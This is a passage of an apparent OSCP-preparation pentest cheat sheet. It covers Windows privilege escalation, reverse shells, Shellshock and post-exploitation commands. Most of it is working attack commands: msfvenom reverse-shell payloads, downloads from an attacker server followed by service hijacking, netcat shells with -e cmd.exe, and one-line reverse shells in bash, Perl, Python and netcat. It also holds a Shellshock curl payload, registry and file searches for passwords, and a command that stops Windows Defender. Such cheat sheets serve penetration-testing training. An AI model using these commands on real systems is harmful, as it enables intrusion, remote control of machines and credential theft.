Interesting Services -non Microsoft-(T1007)\n\nfilepermsvc(Apache Software Foundation - File Permissions Service)[\"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"] - Manual - Stopped\n    File Permissions: Everyone [AllAccess]</code></pre><h5 id=\"exploitation-2\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nmsfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f exe > program.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/program.exe', 'C:\\Temp\\program.exe')\ncopy /y c:\\Temp\\program.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\nsc start filepermsvc</code></pre><h4 id=\"startup-applications\">Startup applications</h4>\n<h5 id=\"detection-3\">Detection</h5>\n<pre class=\"language-\"><code class=\"language-\">icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\nC:\\>icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup BUILTIN\\Users:(F)\n                                                             TCM-PC\\TCM:(I)(OI)(CI)(DE,DC)\n                                                             NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                             BUILTIN\\Administrators:(I)(OI)(CI)(F)\n                                                             BUILTIN\\Users:(I)(OI)(CI)(RX)\n                                                             Everyone:(I)(OI)(CI)(RX)\n\nIf the user you're connecte with has full access (F) to the directory (here Users) then it's vulnerable.</code></pre><h5 id=\"exploitation-3\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nmsfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f exe > program.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\ncd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/program.exe', '.\\program.exe')\n\nTo execute it with elevated privileges we need to wait for someone in the Admin group to login.</code></pre><h4 id=\"weak-service-permission\">Weak service permission</h4>\n<h5 id=\"detection-4\">Detection</h5>\n<pre class=\"language-\"><code class=\"language-\"># Find all services authenticated users have modify access onto\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\n\nif SERVICE_ALL_ACCESS then vulnerable\n\n# Find all weak folder permissions per drive.\naccesschk.exe /accepteula -uwdqs Users c:\\\naccesschk.exe /accepteula -uwdqs \"Authenticated Users\" c:\\\n\n# Find all weak file permissions per drive.\naccesschk.exe /accepteula -uwqs Users c:\\*.*\naccesschk.exe /accepteula -uwqs \"Authenticated Users\" c:\\*.*</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">powershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking service permissions...\n\nServiceName   : daclsvc\nPath          : \"C:\\Program Files\\DACL Service\\daclservice.exe\"\nStartName     : LocalSystem\nAbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'\nCanRestart    : True</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">winPEAS.exe\n\n[+] Interesting Services -non Microsoft-(T1007)\n\ndaclsvc(DACL Service)[\"C:\\Program Files\\DACL Service\\daclservice.exe\"] - Manual - Stopped\n    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles\n\n[+] Modifiable Services(T1007)\n    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:\n    daclsvc: WriteData/CreateFiles</code></pre><h5 id=\"exploitation-4\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/nc.exe', '.\\nc.exe')\nsc config <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SERVICENAME</span><span class=\"token punctuation\">></span></span> binpath= \"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PATH</span><span class=\"token punctuation\">></span></span>\\nc.exe <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -e cmd.exe\"\nsc start <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SERVICENAME</span><span class=\"token punctuation\">></span></span>\nor \nnet start <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SERVICENAME</span><span class=\"token punctuation\">></span></span></code></pre><h4 id=\"unquoted-service-paths\">Unquoted service paths</h4>\n<h5 id=\"detection-5\">Detection</h5>\n<pre class=\"language-\"><code class=\"language-\">powershell -exec bypass -command \"&amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\"\n\n[*] Checking for unquoted service paths...\n\nServiceName    : unquotedsvc\nPath           : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\nModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\\;IdentityReference=NT AUTHORITY\\Authenticated Users}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HijackPath</span><span class=\"token punctuation\">></span></span>\nCanRestart     : True\n\nServiceName    : unquotedsvc\nPath           : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\nModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\\; IdentityReference=NT AUTHORITY\\Authenticated Users}\nStartName      : LocalSystem\nAbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>HijackPath</span><span class=\"token punctuation\">></span></span>\nCanRestart     : True</code></pre><p>or</p>\n<pre class=\"language-\"><code class=\"language-\">winPEAS.exe\n\n[+] Interesting Services -non Microsoft-(T1007)\n\nunquotedsvc(Unquoted Path Service)[C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected</code></pre><h5 id=\"exploitation-5\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nmsfvenom -p windows/shell_reverse_tcp LHOST=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> LPORT=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -f exe > Common.exe\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\ncd \"C:\\Program Files\\Unquoted Path Service\\\"\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/Common.exe', '.\\Common.exe')\nsc start unquotedsvc</code></pre><h4 id=\"hot-potato\">Hot potato</h4>\n<h5 id=\"exploitation-6\">Exploitation</h5>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nsudo python -m SimpleHTTPServer 80\nsudo nc -lvp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>\n\n# Victim\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/nc.exe', '.\\nc.exe')\npowershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/Tater.ps1.exe', '.\\Tater.ps1.exe')\npowershell -exec bypass -command \"&amp; { Import-Module .\\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\\nc.exe <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> -e cmd.exe' }\"</code></pre><h4 id=\"cve\">CVE</h4>\n<pre class=\"language-\"><code class=\"language-\"># Already compiled exploit\nhttps://github.com/SecWiki/windows-kernel-exploits\nhttps://github.com/abatchy17/WindowsExploits</code></pre><h5 id=\"windows-xp\">Windows XP</h5>\n<table>\n<thead>\n<tr>\n<th align=\"center\">CVE</th>\n<th align=\"left\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CVE-2002-1214</td>\n<td align=\"left\">ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2003-0352</td>\n<td align=\"left\">ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2003-0533</td>\n<td align=\"left\">MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2003-0719</td>\n<td align=\"left\">ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2003-0812</td>\n<td align=\"left\">ms03_049_netapi - exploits a stack buffer overflow in the NetApi32</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2003-0818</td>\n<td align=\"left\">ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2003-0822</td>\n<td align=\"left\">ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2004-0206</td>\n<td align=\"left\">ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2010-3138</td>\n<td align=\"left\">EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2010-3147</td>\n<td align=\"left\">EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2010-3970</td>\n<td align=\"left\">ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2011-1345</td>\n<td align=\"left\">Internet Explorer does not properly handle objects in memory - allows remote execution of code via object</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2011-5046</td>\n<td align=\"left\">EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2012-4349</td>\n<td align=\"left\">Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root</td>\n</tr>\n</tbody></table>\n<h5 id=\"windows-7\">Windows 7</h5>\n<table>\n<thead>\n<tr>\n<th align=\"center\">CVE</th>\n<th align=\"left\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CVE-2010-0232</td>\n<td align=\"left\">ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2010-2568</td>\n<td align=\"left\">ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2010-2744</td>\n<td align=\"left\">EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2010-3227</td>\n<td align=\"left\">EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2014-4113</td>\n<td align=\"left\">ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2014-4114</td>\n<td align=\"left\">ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-0016</td>\n<td align=\"left\">ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer&#39;s sandbox - code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2018-8494</td>\n<td align=\"left\">remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input</td>\n</tr>\n</tbody></table>\n<h5 id=\"windows-8\">Windows 8</h5>\n<table>\n<thead>\n<tr>\n<th align=\"center\">CVE</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CVE-2013-0008</td>\n<td>ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2013-1300</td>\n<td>ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2013-3660</td>\n<td>ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2013-3918</td>\n<td>ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2013-7331</td>\n<td>ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine&#39;s filenames</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2014-6324</td>\n<td>ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2014-6332</td>\n<td>ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2014-6352</td>\n<td>ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-0002</td>\n<td>ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation</td>\n</tr>\n</tbody></table>\n<h5 id=\"windows-10\">Windows 10</h5>\n<table>\n<thead>\n<tr>\n<th align=\"center\">CVE</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CVE-2015-0057</td>\n<td>exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-1769</td>\n<td>MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-2426</td>\n<td>ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-2479</td>\n<td>MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-2513</td>\n<td>MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-2423</td>\n<td>MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-2431</td>\n<td>MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2015-2441</td>\n<td>MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution</td>\n</tr>\n</tbody></table>\n<h5 id=\"windows-server-2003\">Windows Server 2003</h5>\n<table>\n<thead>\n<tr>\n<th align=\"center\">CVE</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CVE-2008-4250</td>\n<td>ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX</td>\n</tr>\n<tr>\n<td align=\"center\">CVE-2017-8487</td>\n<td>allows an attacker to execute code when a victim opens a specially crafted file - remote code execution</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"proofs\">PROOFS</h2>\n<h3 id=\"linux-5\">Linux</h3>\n<pre class=\"language-\"><code class=\"language-\">echo \" \";echo \"uname -a:\";uname -a;echo \" \";echo \"hostname:\";hostname;echo \" \";echo \"id\";id;echo \" \";echo \"ifconfig:\";/sbin/ifconfig -a;echo \" \";echo \"proof:\";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo \" \"</code></pre><h3 id=\"windows-5\">Windows</h3>\n<pre class=\"language-\"><code class=\"language-\">echo. &amp; echo. &amp; echo whoami: &amp; whoami 2> nul &amp; echo %username% 2> nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp;  type \"C:\\Documents and Settings\\Administrator\\Desktop\\proof.txt\"</code></pre><hr>\n<h2 id=\"reverse-shell\">REVERSE SHELL</h2>\n<h3 id=\"amazing-tool-for-shell-generation\">Amazing tool for shell generation</h3>\n<pre class=\"language-\"><code class=\"language-\"># Download\ngit clone https://github.com/ShutdownRepo/shellerator\n\n# Install requirements\npip3 install --user -r requirements.txt\n\n# Executable from anywhere\nsudo cp shellrator.py /bin/shellrator</code></pre><h3 id=\"bash-1\">Bash</h3>\n<pre class=\"language-\"><code class=\"language-\">bash -i >&amp; /dev/tcp/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> 0>&amp;1</code></pre><h3 id=\"perl-1\">Perl</h3>\n<pre class=\"language-\"><code class=\"language-\">perl -e 'use Socket;$i=\"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\";$p=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"/bin/sh -i\");};'</code></pre><h3 id=\"python-1\">Python</h3>\n<pre class=\"language-\"><code class=\"language-\">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\",<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</code></pre><h3 id=\"netcat-1\">Netcat</h3>\n<pre class=\"language-\"><code class=\"language-\">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> >/tmp/f</code></pre><h3 id=\"more-reverse-shell\">More reverse shell</h3>\n<pre class=\"language-\"><code class=\"language-\">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</code></pre><h3 id=\"interactive-shell\">Interactive shell</h3>\n<pre class=\"language-\"><code class=\"language-\"># Python\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# Bash\necho os.system('/bin/bash')\n\n# Sh\n/bin/bash -i\n\n# Perl\nperl -e 'exec \"/bin/bash\"'\n\n# Ruby\nexec \"/bin/bash\"\n\n# Lua\nos.execute('/bin/bash')</code></pre><h3 id=\"adjust-interactive-shell\">Adjust Interactive shell</h3>\n<pre class=\"language-\"><code class=\"language-\">stty size # Find your terminal size -> 50 235\nCtrl-Z\nstty raw -echo  // Disable shell echo\nfg\nexport SHELL=bash\nexport TERM=xterm OR export TERM=xterm-256color\nstty rows 50 columns 235</code></pre><hr>\n<h2 id=\"shellshock\">SHELLSHOCK</h2>\n<pre class=\"language-\"><code class=\"language-\">curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'\" <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>URL</span><span class=\"token punctuation\">></span></span>/cgi-bin/<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>SCRIPT</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"useful-linux-commands\">USEFUL LINUX COMMANDS</h2>\n<h3 id=\"find-a-file\">Find a file</h3>\n<pre class=\"language-\"><code class=\"language-\">locate <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>\nfind / -name \"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>\"</code></pre><h3 id=\"active-connection\">Active connection</h3>\n<pre class=\"language-\"><code class=\"language-\">netstat -lntp</code></pre><h3 id=\"list-all-suid-files\">List all SUID files</h3>\n<pre class=\"language-\"><code class=\"language-\">find / -perm -4000 2>/dev/null</code></pre><h3 id=\"determine-the-current-version-of-linux\">Determine the current version of Linux</h3>\n<pre class=\"language-\"><code class=\"language-\"> cat /etc/issue</code></pre><h3 id=\"determine-more-information-about-the-environment\">Determine more information about the environment</h3>\n<pre class=\"language-\"><code class=\"language-\">uname -a</code></pre><h3 id=\"list-processes-running\">List processes running</h3>\n<pre class=\"language-\"><code class=\"language-\">ps -faux</code></pre><h3 id=\"list-the-allowed-and-forbidden-commands-for-the-invoking-use\">List the allowed (and forbidden) commands for the invoking use</h3>\n<pre class=\"language-\"><code class=\"language-\">sudo -l</code></pre><hr>\n<h2 id=\"useful-windows-commands\">USEFUL WINDOWS COMMANDS</h2>\n<pre class=\"language-\"><code class=\"language-\">net config Workstation\nsysteminfo\nnet users\n\nipconfig /all\nnetstat -ano\n\nschtasks /query /fo LIST /v\ntasklist /SVC\nnet start\nDRIVERQUERY\n\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\n\ndir /s pass == cred == vnc == .config\nfindstr /si password *.xml *.ini *.txt\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\n# Disable windows defender\nsc stop WinDefend\n\n# Bypass restriction\npowershell -nop -ep bypass\n\n# List hidden files\ndir /a\n\n# Find a file\ndir /b/s \"<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span>\"</code></pre><hr>\n<h2 id=\"zip\">ZIP</h2>\n<pre class=\"language-\"><code class=\"language-\">fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip\n\nzip2john file.zip > zip.john\njohn --wordlist=<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> zip.john</code></pre>","date":"2021-12-02","excerpt":"\r\nThis is an cheatsheet for OSCP preparations.\r\n\r\n ","printDate":"December 2, 2021","printReadingTime":"31 min read"}